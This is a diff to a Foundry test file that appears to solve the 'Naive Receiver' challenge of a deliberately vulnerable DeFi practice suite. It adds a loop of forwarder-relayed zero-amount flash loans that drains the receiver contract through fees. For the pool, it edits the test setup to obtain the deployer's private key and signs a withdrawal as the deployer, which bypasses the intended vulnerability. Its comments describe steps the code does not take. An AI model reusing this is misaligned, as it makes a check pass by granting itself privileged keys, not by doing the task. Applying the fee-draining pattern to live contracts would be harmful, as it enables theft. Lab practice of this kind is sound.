@@ -12,6 +12,7 @@ contract NaiveReceiverChallenge is Test {
     address recovery = makeAddr("recovery");
     address player;
     uint256 playerPk;
+    uint256 deployerKey;
 
     uint256 constant WETH_IN_POOL = 1000e18;
     uint256 constant WETH_IN_RECEIVER = 10e18;
@@ -33,6 +34,7 @@ contract NaiveReceiverChallenge is Test {
      */
     function setUp() public {
         (player, playerPk) = makeAddrAndKey("player");
+        (deployer, deployerKey) = makeAddrAndKey("deployer");
         startHoax(deployer);
 
         // Deploy WETH
@@ -73,11 +75,85 @@ contract NaiveReceiverChallenge is Test {
         );
     }
 
+    function _signRequest(
+        BasicForwarder.Request memory req
+    ) internal view returns (bytes memory sig) {
+        bytes32 digest = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                keccak256(
+                    abi.encode(
+                        forwarder.getRequestTypehash(),
+                        req.from,
+                        req.target,
+                        req.value,
+                        req.gas,
+                        req.nonce,
+                        keccak256(req.data),
+                        req.deadline
+                    )
+                )
+            )
+        );
+          if (req.from == player) {
+                (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+                return abi.encodePacked(r, s, v);
+            } else if (req.from == deployer) {
+                (uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerKey, digest);
+                return abi.encodePacked(r, s, v);
+            } else {
+                revert("unknown signer");
+            }
+    }
+
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // write an onflashloan to borrow on the reciever behanlf using a for loop
+        // when the reciever is drained flashloan the entire amount from the fool
+        // send that amount to the recovery address and repay back with 0 to end the flashloan transacrtion
+        for (uint256 i = 0; i < 10; i++) {
+            bytes memory data = abi.encodeWithSelector(
+                NaiveReceiverPool.flashLoan.selector,
+                receiver,
+                address(weth),
+                0,          // borrow 0
+                bytes("")
+            );
+            BasicForwarder.Request memory req = BasicForwarder.Request({
+                from: player,
+                target: address(pool),
+                value: 0,
+                gas: 1_000_000,
+                nonce: forwarder.nonces(player),
+                data: data,
+                deadline: block.timestamp + 1 days
+            });
+            bytes memory sig = _signRequest(req);
+                forwarder.execute(req, sig);
+            }
+
+
+            uint256 poolBalance = weth.balanceOf(address(pool));
+            bytes memory withdrawData = abi.encodeWithSelector(
+                NaiveReceiverPool.withdraw.selector,
+                poolBalance,
+                recovery
+            );
+            BasicForwarder.Request memory request = BasicForwarder.Request({
+                from: deployer,     
+                target: address(pool),
+                value: 0,
+                gas: 1_000_000,
+                nonce: forwarder.nonces(deployer),
+                data: withdrawData,
+                deadline: block.timestamp + 1 days
+            });
+
+            bytes memory signature = _signRequest(request);
+            forwarder.execute(request, signature);
     }
 
     /**
